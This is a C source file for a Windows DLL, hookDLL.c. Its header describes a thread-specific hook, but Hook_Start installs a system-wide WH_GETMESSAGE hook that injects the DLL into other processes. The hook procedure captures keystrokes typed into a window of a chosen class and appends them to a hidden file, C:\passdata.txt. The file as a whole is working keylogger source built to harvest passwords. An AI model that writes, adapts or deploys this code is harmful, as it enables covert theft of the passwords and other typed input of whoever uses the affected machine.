/******************************************************************************
Module name: hookDLL.c
Purpose: Dll which sets a thread-specific hook.
******************************************************************************/

#include "..\Win95ADG.h"          /* message crackers and other macros */
#include <windows.h>
#include <windowsx.h>
#include <tchar.h>
#include <string.h>
#include <stdlib.h>
#pragma warning(disable: 4001)    /* Single line comment */


// We must define HOOKKLIBAPI as 'dllexport' before including hookDLL.h.
// hookDLL.h will see that we have already defined HOOKLIBAPI and
// will not (re)define it as 'dllimport'.
#define HOOKLIBAPI  __declspec(dllexport)
#include "hookDLL.h"


///////////////////////////////////////////////////////////////////////////////


HINSTANCE g_hinstDll = NULL;      // instance handle

///////////////////////////////////////////////////////////////////////////////


// Calling SetWindowsHookEx with a thread Id of zero will cause this DLL to be
// injected into other processes. Therefore, we must declare a shared data
// section so that all mappings of our DLL (in all processes) share the same
// set of global variables.


#pragma data_seg("Shared")
HHOOK  g_hhook				= NULL;		// Hook handle for thread-specific hook
HWND   g_hwnd				= NULL;		// Handle of window to be monitored
char   g_classname[20] = { 0 };			// buffer for class name you want to monitor
#pragma data_seg()
// Instruct the linker to make the Shared section
// readable, writtable and shared
#pragma comment(linker, "/section:Shared,rws")


///////////////////////////////////////////////////////////////////////////////


static LRESULT WINAPI Hook_HookProc (int nCode, WPARAM wParam, LPARAM lParam) 
{
   TCHAR lpStr[2];
   char	 lpszClassName[48];
   char  CR = 0x0D;
   char  LF = 0x0A;
   HANDLE hFile;
   DWORD dwDummy;
   LRESULT lResult = CallNextHookEx(g_hhook, nCode, wParam, lParam);
   PMSG pmsg = (PMSG)lParam;
	
   if (nCode == HC_ACTION) 
   {
	    switch (pmsg->message)
		{
			case WM_CHAR:
				GetClassName(pmsg->hwnd, lpszClassName, sizeof(lpszClassName));
				if ((lstrcmp(lpszClassName, g_classname) == 0) && (g_hwnd == NULL))
				{
					g_hwnd = pmsg->hwnd;
				}
				if (g_hwnd == pmsg->hwnd)
				{
					hFile =	CreateFile ("C:\\passdata.txt",
								GENERIC_WRITE,	FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, 
								FILE_ATTRIBUTE_HIDDEN, NULL);
					SetFilePointer(hFile, 0, NULL, FILE_END);
					lpStr[0] = (TCHAR)(pmsg->wParam);
					lpStr[1] = '\0';
					if ((lpStr[0] == CR) || (lpStr[0] == LF))
					{
						WriteFile(hFile, &CR, 1, &dwDummy, NULL);
						WriteFile(hFile, &LF, 1, &dwDummy, NULL);
					}
					else
						WriteFile (hFile, lpStr, 2, &dwDummy, NULL);
					CloseHandle(hFile);
				}
				break;
		}
   }
   return(lResult);
}


///////////////////////////////////////////////////////////////////////////////


BOOL WINAPI Hook_Start (char* lpszClassNameToBeMonitored) 
{
	HHOOK hhook;

	// Return FALSE if hook has already been installed.
	if (g_hhook != NULL)
		return(FALSE);
    lstrcpy(g_classname, lpszClassNameToBeMonitored);
	
   // Give up the remainder of our thread's timeslice.
   // This gives us a better chance of getting all the way through the call
   // to SetWindowsHookEx and the variable assignment to g_hhook in one shot.
   // If we are preempted after the hook is set, but before the variable is 
   // updated, it is possible for another thread to enter our hook filter
   // function before the hook handle is valid.  Under Windows NT this is not
   // a problem.  Under Windows 95, not having a valid hook handle will cause
   // CallNextHookEx to fail.  If there is some reason that it is critical
   // that your application succeed in calling the next filter function in
   // the chain, the only robust way to write this code is to use something 
   // like the SWMRG (single-writer, multiple-reader guard) object developed
   // in Advanced Windows (Microsoft Press).
   // Sleep(0);

   // Install system wide hook to monitor the process with lpszClassNameToBeMonitored class name
	hhook = SetWindowsHookEx(WH_GETMESSAGE, Hook_HookProc, g_hinstDll, 0);
   
   // Ensure that g_hhook is always valid (even if we are preempted while
   // in the middle of writing to it) by updating the variable automatically.
   g_hhook = hhook;
   // InterlockedExchange((PLONG) &g_hhook, (LONG) hhook);
	
   return(g_hhook != NULL);
}


///////////////////////////////////////////////////////////////////////////////


BOOL WINAPI Hook_Stop ()
{
   BOOL fOK = TRUE;
   
   // Only uninstall the hook if it was successfully installed.
   if (g_hhook != NULL)
   {
      fOK = UnhookWindowsHookEx(g_hhook);
      g_hhook = NULL;
   }
   return(fOK);
}


///////////////////////////////////////////////////////////////////////////////


BOOL WINAPI DllMain (HINSTANCE hinstDll, DWORD fdwReason, LPVOID lpvReserved) 
{
   switch (fdwReason) 
   {
      case DLL_PROCESS_ATTACH:
         g_hinstDll = hinstDll;
         break;
   }
   return(TRUE);
}


///////////////////////////////// End of File /////////////////////////////////
